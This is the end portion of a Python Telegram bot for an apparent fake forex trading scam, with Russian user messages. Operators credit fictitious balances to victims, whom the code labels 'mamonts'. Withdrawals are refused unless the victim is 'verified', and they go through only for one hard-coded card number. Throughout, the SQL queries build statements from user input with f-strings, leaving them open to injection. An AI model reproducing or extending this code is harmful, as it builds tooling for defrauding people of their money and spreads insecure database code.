                bot.send_message(call.message.chat.id, f"<b>🤝Не успешная сделка\nВаш убыток: {t}</b>",reply_markup=markup)
            if data[5] == 2:
                markup = types.InlineKeyboardMarkup(row_width=1)
                but = types.InlineKeyboardButton("🧑‍💻Верификация", callback_data="GoVerif")
                but1 = types.InlineKeyboardButton("🛠Поддержка", url="https://t.me/Forex_Tradings_Support ")
                markup.add(but,but1)
                bot.send_message(call.message.chat.id, f"<b>⚠️К сожалению Вы не можете инвестировать на неверифицированом аккаунте!⚠️</b>",reply_markup=markup)

def sumSetInvest(message):
    try:
        sums = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        sql.execute(f"SELECT cash FROM users WHERE id = {message.chat.id}")
        data = sql.fetchone()
        if data[0] < int(sums):
            bot.send_message(message.chat.id, "<b>❌Недостаточно средств!</b>")
        else:
            markup = types.InlineKeyboardMarkup(row_width=2)
            but = types.InlineKeyboardButton("🆙Вверх🆙", callback_data=f"UP_{sums}")
            but1 = types.InlineKeyboardButton("🔽Вниз🔽",  callback_data=f"DOWN_{sums}")
            markup.add(but,but1)
            bot.send_message(message.chat.id, "<b>Определить вектор двежения графика</b>",reply_markup=markup)
    except:
        bot.send_message(message.chat.id, "Введите корректную сумму")


    



def WidtrawDep(message):
    k = message.text
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute(f"SELECT * FROM users WHERE id = {message.chat.id}")
    data = sql.fetchone()
    print(data[2])
    print(data[3])
    if data[2] < int(k):
        bot.send_message(message.chat.id, "<b>❌Недостаточно средств!</b>")
        currectSumWid(message)
    if data[2] >= int(k):
        if data[3] == 'False':
            markup = types.InlineKeyboardMarkup(row_width=1)
            but = types.InlineKeyboardButton("🧑‍💻Верификация", callback_data="GoVerif")
            but1 = types.InlineKeyboardButton("🛠Поддержка", url="https://t.me/Forex_Tradings_Support ")
            markup.add(but,but1)
            bot.send_message(message.chat.id,"<b>🙄К сожалению вывод недоступен с Вашим статусом верификации!\n☄️Чтобы вывести средства Вам требуется пройти верификацию счёта\n<i>Воспользуйтесь одним из способов верификации:</i></b>",reply_markup=markup)
        if data[3] == 'True':
            card = bot.send_message(message.chat.id,"<b>💳Введите номер карты:\n<i>Заполняйте карту без отступов: 0000000000000000</i></b>")
            bot.register_next_step_handler(card, inputCard,k)

def inputCard(message,k):
    card = message.text
    if card != "5355280210627210":
        bot.send_message(message.chat.id,"<b>Карта не привязана для Вывода</b>")
    else:
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        sql.execute(f"SELECT * FROM users WHERE id = {message.chat.id}")
        data = sql.fetchone()
        res = data[2] - int(k)
        sql.execute(f"UPDATE users SET cash = {res} WHERE id = {message.chat.id}")
        sql.execute(f"UPDATE worker SET refcash = {res} WHERE refid = {message.chat.id}")
        db.commit()
        sql.execute(f"SELECT * FROM users WHERE id = {message.chat.id}")
        datas = sql.fetchone()
        bot.send_message(message.chat.id,f"<b>✉️Заявка на Вывод созданна\n💳Карта: {card}\n💸Сумма вывода: {k} UAH\n🏦Баланс: {datas[2]} UAH</b>")


def currectSumWid(message):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute(f'SELECT cash FROM users WHERE id = {message.chat.id}')
    data = sql.fetchone()
    if data[0] == 0: 
        bot.send_message(message.chat.id, f'❌<b>Вывод недоступен!\nНа вашем балансе {data[0]} UAH</b>')
    else:
        k = bot.send_message(message.chat.id, f'✍️<b>Введите сумму которую хотите вывести\nНа вашем балансе <code>{data[0]}</code> UAH</b>')
        bot.register_next_step_handler(k,WidtrawDep)

def GiveMoneuMamont(message,id_Mamont):
    try:
        t = int(message.text)
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        sql.execute(f"SELECT * FROM worker WHERE refid = {id_Mamont}")
        moneuToRef = sql.fetchone()
        endMoneu = moneuToRef[3] + t
        sql.execute(f"UPDATE worker SET refcash = {endMoneu} WHERE refid = {id_Mamont}")
        sql.execute(f"UPDATE users SET cash = {endMoneu} WHERE id = {id_Mamont}")
        bot.send_message(message.chat.id, f"<b>✅Вы пополнили баланс мамонту: @{moneuToRef[2]}\n💲Сумма пополнения: {t} UAH\n❤️Текущий баланс мамонта: {endMoneu}</b>")
        bot.send_message(id_Mamont, f"<b>💌Ваш баланс был пополнен на сумму: {t} UAH\n❤️Текущий баланс: {endMoneu}</b>")
        db.commit()
    except:
        bot.send_message(message.chat.id, "Ошибка!")
        setErrorGiveMoneuMamont(message,id_Mamont)

def setErrorGiveMoneuMamont(message,id_Mamont):
    t = bot.send_message(message.chat.id,text=f"✍️<b>Введите сумму которую хотите начислить мамонту:</b>")
    bot.register_next_step_handler(t,GiveMoneuMamont,id_Mamont)



def addcash():
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    db.commit()
    sql.execute(f"UPDATE users SET cash = {dep} WHERE id = {idLOH}")
    sql.execute(f"UPDATE worker SET refcash = {dep} WHERE refid = {idLOH}")
    db.commit()
    try:
        print("balance refresh")
    except:
        bot.send_message(coder, "❌<b>Не обновился баланс</b>❌")
    bot.send_message(chat_id = idLOH,text=f"Баланс пополнен")
    
    


    
            
bot.infinity_polling()